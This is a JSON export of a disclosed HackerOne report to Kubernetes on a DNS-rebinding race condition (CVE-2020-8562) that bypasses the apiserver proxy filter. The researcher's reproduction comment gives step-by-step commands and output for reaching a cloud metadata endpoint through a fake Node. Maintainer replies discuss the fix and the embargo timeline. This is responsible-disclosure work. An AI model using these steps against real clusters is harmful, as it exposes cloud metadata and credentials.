{
  "id": 859962,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTk5NjI=",
  "url": "https://hackerone.com/reports/859962",
  "title": "Bypass apiserver proxy filter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-04-27T00:04:50.125Z",
  "submitted_at": "2020-04-27T00:04:50.125Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "javierprovecho",
    "url": "/javierprovecho",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8562"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-05-27T19:11:03.856Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-04-27T19:11:00.241Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\n\nTL,DR: Time-of-check (apiserver proxy filter) Time-of-use (apiserver proxy request) Race Condition.\n\nWhen the apiserver is proxying a request to a node though one of its addresses, it performs a filter validation. If the address type is a DNS record (Hostname, ExternalDNS, InternalDNS), the apiserver performs two DNS queries, one for filter validation, another for proxying the request. If the attacker sets the hostname to a custom DNS server, that is able return different values with zero TTL, it is possible to bypass that filter. \n\n## Kubernetes Version:\n1.18.0\n\n## Steps To Reproduce:\n\n### Preparation\n\n  1. Create a server with port UDP/53 (DNS) exposed.\n  2. Delegate a subdomain (e.g. fake.example.com) to the IP address of the server as a NS record.\n  3. Copy, build and run the custom DNS server (source code attached, use `go mod init` and `go mod tidy`).\n  4. Test that it successfully resolves any subdomain of the delegated zone (e.g. toctou.fake.example.com).\n\n### Execution\n\n  1. Create a KIND cluster (manifest attached, defaults to v1.17).\n  2. Create a Node (manifest attached, edit to change domain).\n  3. Start `kubectl proxy`.\n  4. Execute `curl localhost:8001/api/v1/nodes/toctou:80/proxy/`.\n\n## Supporting Material/References:\n\n  * `toctou-cluster.yml`, a KIND cluster manifest\n  * `toctou-node.yml`, a Node with a custom address.\n  * `toctou-dns-server.go`, a custom DNS server that returns different results to consecutive queries.\n\n## Impact\n\nhttps://github.com/kubernetes/kubernetes/pull/71980 was merged to mitigate dangerous proxying through the apiserver. An attacker with access to create nodes and send requests to them through apiserver proxy, could access cloud metadata endpoints or localhost services. This is specially important on as a service providers like https://github.com/oneinfra/oneinfra but could affect any vendor.",
  "weakness": {
    "id": 105,
    "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 804810,
      "file_name": "toctou-dns-server.go",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zycHNRadQBoFoPoNhjvs6GrB?response-content-disposition=attachment%3B%20filename%3D%22toctou-dns-server.go%22%3B%20filename%2A%3DUTF-8%27%27toctou-dns-server.go&response-content-type=text%2Fx-go&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071242Z&X-Amz-Expires=3230&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=38a41b86b23c0c2d2e13eafcaea58ec847bdb72fcfdec0adb06fcc1a1a740e3f",
      "file_size": 2104,
      "type": "text/x-go",
      "moderated": null
    },
    {
      "id": 804811,
      "file_name": "toctou-node.yml",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Sx3MAtsjV6g5pdkBBGbPYbMH?response-content-disposition=attachment%3B%20filename%3D%22toctou-node.yml%22%3B%20filename%2A%3DUTF-8%27%27toctou-node.yml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071242Z&X-Amz-Expires=3230&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2093d75de706de504d23017a7fe0a64958db0ab4b50a4cce9f7b17b0f916510f",
      "file_size": 128,
      "type": "application/x-yaml",
      "moderated": null
    },
    {
      "id": 804812,
      "file_name": "toctou-cluster.yml",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KAqkkdXbqCxSZCy3RjxBv7Qs?response-content-disposition=attachment%3B%20filename%3D%22toctou-cluster.yml%22%3B%20filename%2A%3DUTF-8%27%27toctou-cluster.yml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071242Z&X-Amz-Expires=3230&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e5987b84177be62db32d8c749b5a86bb04d5dcfe0daa2fbf94339a10f673fc17",
      "file_size": 78,
      "type": "application/x-yaml",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-05-27T19:11:00.441Z",
  "allow_singular_disclosure_after": -73310502.25463933,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "ali",
    "yusuf_furkan",
    "badhunter",
    "lonelylol",
    "meispi",
    "ekgaribadmi",
    "d_hack"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 32459,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/kubernetes",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 7804404,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "# Context on the discovery\n\nI was pen testing a control-plane as a service based on https://github.com/oneinfra/oneinfra. Because each control-plane runs as a pod, I was able to proxy requests through it using a fake node (I'll report to them this 2nd vulnerability).\n\nI knew about a PR (https://github.com/kubernetes/kubernetes/pull/71980) which disallowed any proxy request to sensible IPs like cloud metadata endpoints or localhost services. When I reviewed the code, I noticed that the `proxyutil.IsProxyableHostname` didn't pass the verified IP to the next step.\n\nhttps://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/node/strategy.go#L257-L262\n\nAfter validating that:\n- most popular DNS resolvers (e.g. 8.8.8.8) allow a zero TTL on DNS records, which means it will request the record info to the authoritative DNS server on every single client request .\n- go doesn't implement a local DNS cache and rely on the host https://github.com/golang/go/issues/24796\n- most linux distributions don't enforce a higher TTL (like macOS does, 12.5 seconds) https://00f.net/2011/11/17/how-long-does-a-dns-ttl-last/\n\nI was able to return two different results for the same DNS query.\n\n---\n\nI would be happy to contribute a fix to Kubernetes upstream, but though this vulnerability could be severe enough to not be discussed publicly on GitHub. How should it be done?\n\nMaybe the fix should be:\n1. resolving the Hostname without `proxyutil.IsProxyableHostname`\n2. validating the IP with `IsProxyableIP`\n3. building the url with the IP\n4. returning a custom round-tripper that wraps the given one and adds a Host header with the hostname https://github.com/bradleyfalzon/ghinstallation/blob/master/transport.go#L105",
      "automated_response": false,
      "created_at": "2020-04-27T08:04:04.692Z",
      "updated_at": "2020-04-27T08:04:04.692Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7815468,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @javierprovecho - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.",
      "automated_response": false,
      "created_at": "2020-04-27T22:12:24.484Z",
      "updated_at": "2020-04-27T22:12:24.484Z",
      "actor": {
        "username": "h1_analyst_leon",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_leon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7827016,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @javierprovecho - Thanks for the report. Can you please provide more details in your reproduction steps and include each command that needs to be executed? ",
      "automated_response": false,
      "created_at": "2020-04-28T16:33:11.245Z",
      "updated_at": "2020-04-28T16:33:11.245Z",
      "actor": {
        "username": "h1_analyst_leon",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_leon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7829608,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "# Prepare\n\n## Create servers\n\nCreate the following servers. I'm using Digital Ocean but you can use any other provider as long as the requirements are met. Digital Ocean's servers come with a public IP and all their ports are open by default.\n\n- Name: `dns`\n   OS version: Ubuntu 20.04 LTS\n   Size: 1 CPU Core / 1 GB RAM / 10 GB SSD\n   Public IP: yes\n   Firewall: port UDP 53 open to the internet\n\n- Name: `kind`\n   OS version: Ubuntu 18.04 LTS\n   Size: 1 CPU Core / 1 GB RAM / 10 GB SSD\n\n## Delegate domain zone\n\nOn a test/personal domain name, delegate a subdomain by creating the following DNS records. Use `dig` to test that they are resolvable (e.g. with Google DNS):\n\n- Type: `A`\n   Name: `unallowed-address.your-domain.com`\n   Target: `169.254.169.254`\n   ```sh\n   $ dig @8.8.8.8 unallowed-address.your-domain.com +short\n   # The command above should return: 169.254.169.254\n   ```\n\n- Type: `A`\n   Name: `custom-nameserver.your-domain.com`\n   Target: `dns` server IP\n   ```sh\n   $ dig @8.8.8.8 custom-nameserver.your-domain.com +short\n   # The command above should return the dns server IP\n   ```\n\n- Type: `NS`\n   Name: `delegated-subdomain.your-domain.com`\n   Target: `custom-nameserver.your-domain.com`\n   ```sh\n   $ dig @$(dig @8.8.8.8 NS your-domain.com +short | head -1) NS delegated-subdomain.your-domain.com | grep -A1 \"AUTHORITY SECTION\" | tail -1\n   # The command above should return: delegated-subdomain.your-domain.com 300 IN NS custom-nameserver.your-domain.com\n   ```\n\n## Provision `dns` server\n\nStop `systemd-resolved` (it simplifies launching a server on port UDP 53). Change default DNS resolver (e.g. to Google DNS).\n\n```sh\n$ systemctl stop systemd-resolved\n$ echo nameserver 8.8.8.8 > /etc/resolv.conf\n```\n\nInstall Go\n\n```sh\n$ apt update -qq\n$ apt install -qq -y golang\n$ go version\n# The command above should return: go version go1.13.8 linux/amd64\n```\n\nCopy `toctou-dns-server.go` (1st post attachment) to the `dns` server. Generate and download dependencies.\n\n```sh\n$ vi toctou-dns-server.go\n$ go mod init main\n$ go mod tidy\n```\n\nStart the custom dns server.\n\n```sh\n$ go run toctou-dns-server.go -addr 0.0.0.0:53 -domain delegated-subdomain.your-domain.com.\n```\n\nFrom another shell, test that the server receives and answer DNS queries through a public resolver (e.g. with Google DNS).\n\n```sh\n$ dig @8.8.8.8 test.delegated-subdomain.your-domain.com +short\n# The command above should return: 1.1.1.1 (a public IP)\n```\n\n## Provision `kind` server\n\nIf the server's provider is Digital Ocean, change default DNS resolver (e.g. to Google DNS). Digital Ocean DNS servers doesn't work fine with my custom dns server, maybe because I'm missing a SOA record.\n\n```sh\n$ echo nameserver 8.8.8.8 > /etc/resolv.conf\n```\n\nInstall Docker.\n\n```sh\n$ curl -sSL https://get.docker.com | sh\n$ docker --version\n# The command above should return: Docker version 19.03.8\n```\n\nInstall KIND (Kubernetes In Docker).\n\n```sh\n$ curl -Lo /usr/local/bin/kind https://kind.sigs.k8s.io/dl/v0.7.0/kind-Linux-amd64\n$ chmod +x /usr/local/bin/kind\n$ kind --version\n# The command above should return: kind version 0.7.0\n```\n\nInstall kubectl.\n\n```sh\n$ curl -Lo /usr/local/bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.18.2/bin/linux/amd64/kubectl\n$ chmod +x kubectl\n```\n\nCreate a cluster.\n\n```sh\n$ kind create cluster --config - << EOF\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  image: kindest/node:v1.18.0\nEOF\n```\n\nStart a proxy to the apiserver in the background. It will listen on port TCP 8001 by default.\n\n```sh\n$ nohup kubectl proxy > /dev/null 2> /dev/null &\n```\n\n# Attack\n\n## Correct scenario\n\nThe following example demonstrates how a fake node, with a hostname that resolve to an unallowed address (e.g. 169.254.169.254), can't proxy requests through the apiserver.\n\nCreate the node. \n\n```sh\n$ kubectl create -f - << EOF\nkind: Node\napiVersion: v1\nmetadata:\n  name: foo\nstatus:\n  addresses:\n  - address: unallowed-address.your-domain.com\n    type: Hostname\nEOF\n```\n\nUsing the background proxy opened before, try to proxy a request through the apiserver to the node address.\n\n```sh\n$ curl -s localhost:8001/api/v1/nodes/foo:80/proxy/metadata/v1/\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {\n    \n  },\n  \"status\": \"Failure\",\n  \"message\": \"address not allowed\",\n  \"reason\": \"BadRequest\",\n  \"code\": 400\n}\n```\n\nIt fails as expected.\n\n# Vulnerable scenario\n\nThe following example demonstrates how a fake node, with a hostname that resolves every time a different address, can proxy requests through the apiserver to unallowed addresses.\n\nCreate the node. \n\n```sh\n$ kubectl create -f - << EOF\nkind: Node\napiVersion: v1\nmetadata:\n  name: bar\nstatus:\n  addresses:\n  - address: unallowed-address.delegated-subdomain.your-domain.io\n    type: Hostname\nEOF\n```\n\nUsing the background proxy opened before, try to proxy a request through the apiserver to the node address.\n\n```sh\n$ curl -s localhost:8001/api/v1/nodes/bar:80/proxy/metadata/v1/\nid\nhostname\nuser-data\nvendor-data\npublic-keys\nregion\ninterfaces/\ndns/\nfloating_ip/\ntags/\n```\n\nThe request goes through.",
      "automated_response": false,
      "created_at": "2020-04-28T20:51:14.903Z",
      "updated_at": "2020-04-28T20:51:14.903Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7899201,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Any update?",
      "automated_response": false,
      "created_at": "2020-05-05T13:57:13.555Z",
      "updated_at": "2020-05-05T13:57:13.555Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7917870,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Thank you @javierprovecho! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.",
      "automated_response": false,
      "created_at": "2020-05-06T21:28:37.358Z",
      "updated_at": "2020-05-06T21:28:37.358Z",
      "actor": {
        "username": "h1_analyst_leon",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_leon",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 7967639,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-11T21:05:19.086Z",
      "updated_at": "2020-05-11T21:05:19.086Z",
      "actor": {
        "url": "/kubernetes",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Kubernetes"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "kubernetes",
      "collaborator": {
        "username": "javierprovecho",
        "url": "/javierprovecho"
      }
    },
    {
      "id": 8237290,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@javierprovecho Thank you for the great report, and your patience! \n\nThe fix we've identified involves returning a validated IP from the `IsProxyableHostname()` function, and setting that in the [`ResourceLocation()` ](https://github.com/kubernetes/kubernetes/blob/a36b9a992223a71d822f3a0680f6b5202d2687d8/pkg/registry/core/node/strategy.go#L262) response URL. In order to not break TLS, this will require changing the `proxyTransport` parameter in `ResourceLocation()` from an `http.RoundTripper` to an `*http.Transport`, setting the `proxyTransport.TLSClientConfig.ServerName` to the proxied hostname, and plumbing that type change all the way up the stack.\n\nWe believe this issue also affects the [in-progress fix](https://github.com/kubernetes/kubernetes/pull/91785) for [CVE-2020-8555](https://github.com/kubernetes/kubernetes/issues/91542). After that fix is merged, we'll be sending an [embargoed notification to distributors](https://github.com/kubernetes/security/blob/master/private-distributors-list.md) with a patch.\n\nI don't have any firm dates for you yet, but based on the current pandemic, global protests, previous embargo periods, and the [patch release cycle](https://github.com/kubernetes/sig-release/blob/master/releases/patch-releases.md#upcoming-monthly-releases), I would guess this will land publicly in August or September. Does that rough timeline seem agreeable to you?\n\nMicah Hausler, on behalf of the Kubernetes Product Security Committee",
      "automated_response": false,
      "created_at": "2020-06-08T22:33:12.219Z",
      "updated_at": "2020-06-08T22:33:12.219Z",
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 8250327,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @mhausler,\n\nThat timeline looks good to me.\n\nThanks,\nJavier.",
      "automated_response": false,
      "created_at": "2020-06-10T06:50:36.585Z",
      "updated_at": "2020-06-10T06:50:36.585Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 8424707,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @mhausler,\n\nKubeCon NA CFP is due June 28th. The event will take place on November 17th. At this date, the vulnerability should have been already disclosed and patched.\n\n- How can I submit a proposal about this vulnerability without disclosing it?\n\n- Is it possible or I must wait for the next KubeCon edition in 2021 (EU/NA)?\n\nI'll wait for your guidelines (if any) on this.\n\nThanks,\nJavier.",
      "automated_response": false,
